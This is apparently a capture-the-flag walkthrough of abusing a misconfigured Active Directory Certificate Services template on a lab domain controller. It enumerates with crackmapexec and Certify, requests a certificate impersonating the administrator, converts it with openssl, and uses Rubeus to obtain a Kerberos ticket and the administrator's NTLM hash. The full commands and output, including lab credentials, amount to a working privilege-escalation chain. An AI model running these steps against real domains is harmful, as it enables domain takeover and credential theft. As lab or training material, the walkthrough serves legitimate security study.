## # `Certify` -

Download [Certify](https://github.com/GhostPack/Certify) 

Certify helps us to find out any templates in this ADCS that are insecurely configured.

#### Identify ADCS :

One thing that always needs enumeration on a Windows domain is to look for Active Directory Certificate Services (ADCS). A quick way to check for this is using `crackmapexec` -

```bash
oxdf@hacky$ crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.202    636    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 
ADCS                                                Found PKI Enrollment Server: dc.sequel.htb
ADCS                                                Found CN: sequel-DC-CA
```

#### Identify Vulnerable Template :

With ADCS running, the next question is if there are any templates in this ADCS that are insecurely configured. To enumerate further, I’ll upload a copy of [Certify](https://github.com/GhostPack/Certify) by downloading a copy from [SharpCollection](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_Any), and uploading it to the victim machine :

```bash
*Evil-WinRM* PS C:\programdata> upload Certify.exe
Info: Uploading Certify.exe to C:\programdata\Certify.exe

Data: 236884 bytes of 236884 bytes copied

Info: Upload successful!
```

The README for Certify has walkthrough of how to enumerate and abuse certificate services. First it shows running `Certify.exe find /vulnerable`. By default, this looks across standard low privilege groups. I like to add `/currentuser` to instead look across the groups for the current user, but both are valuable depending on the scenario.

```powershell
*Evil-WinRM* PS C:\programdata> .\Certify.exe find /vulnerable /currentuser
...[snip]...
[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT 
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
```

The danger here is that `sequel\Domain Users` has Enrollment Rights for the certificate (this is scenario 3 in the Certify README).

### Abuse Template -

You can continue with the README scenario 3 by next running `Certify.exe` to request a certificate with an alternative name of administrator. It returns a `cert.pem` :

```powershell
*Evil-WinRM* PS C:\programdata> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

   _____          _   _  __
  / ____|        | | (_)/ _|                                    
 | |     ___ _ __| |_ _| |_ _   _                               
 | |    / _ \ '__| __| |  _| | | |                              
 | |___|  __/ |  | |_| | | | |_| |                              
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0                                                        

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 10

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAo56P0pa6nWXkj3HrM2V1c3K6V8YIsDZmPIArLsqA4M9j+iey
da4m1KrKO/aVGCJ+DISe0nl6q/7OuaQd2zyjgJJXXFqzC8/JJGqJe810LSoAyDHX
...[snip]...
dOlhVtGXsvdK//0SELfhlVAX0jzBiUhNbifCDmoakNpfGouSuNxglg==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAAqifcP7M+EvDgAAAAAACjANBgkqhkiG9w0BAQsF
...[snip]...
+Aa1fv7lFabU7ksILNBuyVhfssYDSA==
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:14.0570539
```

Both the README and the end of that output show the next step. I’ll copy everything from `-----BEGIN RSA PRIVATE KEY-----` to `-----END CERTIFICATE-----` into a file on my host and convert it to a `.pfx` using the command given, entering no password when prompted:

```bash
oxdf@hacky$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
```

Upload `cert.pfx`, as well as a copy of [Rubeus](https://github.com/GhostPack/Rubeus) (downloaded from [SharpCollection](https://github.com/Flangvik/SharpCollection)), and then run the `asktgt` command, passing it the certificate to get a TGT as administrator :

```powershell
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx

   ______        _                                    
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)              
  | |  \ \| |_| | |_) ) ____| |_| |___ |                      
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: fe80::8d7f:f6bb:9223:b131%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMC
AQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBB+zJ4ljVoL7
...[snip]...
```

Alternatively, Instead, run the same command with `/getcredentials /show /nowrap`. This will do the same thing, _and_ try to dump credential information about the account :

```powershell
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: fe80::8d7f:f6bb:9223:b131%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

    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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  6/10/2023 11:55:40 AM
  EndTime                  :  6/10/2023 9:55:40 PM
  RenewTill                :  6/17/2023 11:55:40 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  wQwBZG8kD08gcDFXQEphBg==
  ASREP (key)              :  6E9A560FDF5290880A1C806FB5B0062C

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```

The last line is the NTLM hash for the administrator account.